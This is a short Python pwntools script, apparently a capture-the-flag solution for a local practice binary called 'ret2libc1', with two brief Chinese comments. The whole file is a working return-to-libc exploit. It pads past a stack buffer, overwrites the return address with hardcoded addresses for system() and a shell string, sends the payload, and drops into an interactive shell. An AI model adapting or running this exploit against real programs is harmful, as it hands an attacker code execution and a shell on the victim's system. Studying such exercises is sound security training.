
from pwn import *

def main():

    sh = process('./ret2libc1')

    system = 0x08048460

    shell_addr = 0x08048720

    offset = 0x6c + 4
    
    ## 构造payload
    payload = 'A' * offset + \
        p32(system).decode('unicode_escape') + \
        'AAAA' + \
        p32(shell_addr).decode('unicode_escape')

    ## 向程序发送字符串
    sh.sendline(payload)


    sh.interactive()

if __name__ == "__main__":
    main()

